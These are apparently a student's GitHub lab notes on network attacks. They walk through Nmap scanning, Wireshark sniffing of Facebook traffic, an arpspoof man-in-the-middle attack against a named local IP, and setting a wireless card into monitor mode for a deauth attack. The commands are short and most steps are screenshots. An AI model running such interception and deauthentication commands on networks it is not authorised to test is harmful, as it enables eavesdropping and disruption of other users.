## NMAP XENDER

Nmap 192.168.43.176 

Nmap -sV 192.168.43.176

arp -a to know the hosts up
![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/p1.png)

Nmap -sV 192.168.43.28 to scan our target
![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/p2.png)

Nmap -sV 192.168.43.28 to confirm the host up
![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/p4.png)







## Facebook.com sniffing with wireshark
![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/p5.png)

## Enable promiscious mode on all interface
![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/p6.png)




## Arpspoof


Directing the traffic to my network




Lauch the attack with - sudo arpspoof- -i wlan0 -t 192.168.43.223 -r 192.168.43.1
![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/c1.png)



How to know the network to attack - sudo nmap 192.168.43.0-255

![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/c2.png)


To confirm the attack arp -a

![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/c3.png)



### Deauth Attack

# Having the wireless card to engage into monitor mode

# Type iwconfig in the terminal and look for your wireless card (Typically called wlan0)

#  To get the card into monitor mode we will run the airmon-ng program of the aircrack-ng suite.

# In the terminal type: airmon-ng check kill (This will kill any processes that might interfere with the desired functionality)

![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/b1.png)

# Now type airmon-ng start wlan0 

![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/b2.png)

![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/b3.png)

![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/b4.png)

![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/b5.png)
